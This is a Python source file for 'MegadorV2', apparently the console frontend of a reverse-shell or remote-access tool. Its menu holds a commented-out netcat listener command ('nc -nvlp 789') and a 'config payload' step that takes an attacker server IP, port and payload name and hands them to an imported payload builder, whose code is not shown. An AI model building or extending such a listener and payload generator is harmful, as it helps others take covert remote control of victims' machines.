from colorama import Style,Fore
import time
import os
from  construtor.gerador import __CONSTRUTOR_DE_PAYLOAD__

class Megador:
    def __init__(self):
        self.iniciar_loop = True
    
    def Cor(self, texto,Id):
        match Id:
            case 1:
                objeto = f'\n{Style.BRIGHT}{Fore.CYAN}{texto}{Fore.RESET}'
                return objeto
            case 2:
                objeto = f'\n{Style.BRIGHT}{Fore.GREEN}{texto}{Fore.RESET}'
                return objeto
            case 3:
                objeto = f'\n{Style.BRIGHT}{Fore.RED}{texto}{Fore.RESET}'
                return objeto

        
    def sistema_de_comandos(self):
        match self.comando:
            case 'start server':
                print(self.Cor("Iniciando Servidor na porta: 789", 1))
                               #os.system('nc -nvlp 789')
            case 'exit':
                print(self.Cor("Encerrando o sistema...\n",3))
                time.sleep(5)
                os.system("cls")
                self.iniciar_loop = False
            case 'config payload':
                self.criar_pyload()

    def criar_pyload(self):
        contrutor = __CONSTRUTOR_DE_PAYLOAD__()
        contrutor.IP_DO_SERVIDOR = input('IP SERVIDOR: ')
        contrutor.PORTA_DO_SERVIDOR = input('PORTA SERVIDOR: ')
        contrutor.NOME_PAYLOAD = input("Nome payload: ")
        contrutor.NOME_PASTA = input('Nome da pasta: ')
        contrutor.INICIAR_CONSTRUCAO()

    def carregar_logo_megador(self):
        os.system("cls")
        self.logo = self.Cor("""
    __  __ ______ _____          _____   ____  _____  
    |  \/  |  ____/ ____|   /\   |  __ \ / __ \|  __ \ 
    | \  / | |__ | |  __   /  \  | |  | | |  | | |__) |
    | |\/| |  __|| | |_ | / /\ \ | |  | | |  | |  _  / 
    | |  | | |____ |__| |/ ____ \| |__| | |__| | | \ \ 
    |_|  |_|______\_____/_/    \_\_____/ \____/|_|  \_/
    """,2
            )
        print(self.logo)
        
        
    def mainloop(self):
        os.system("cls")
        self.carregar_logo_megador()
        while self.iniciar_loop:
            self.comando = input(self.Cor("|MegadorV2> ",1))
            self.sistema_de_comandos()
        
    def Update(self):
        self.mainloop()
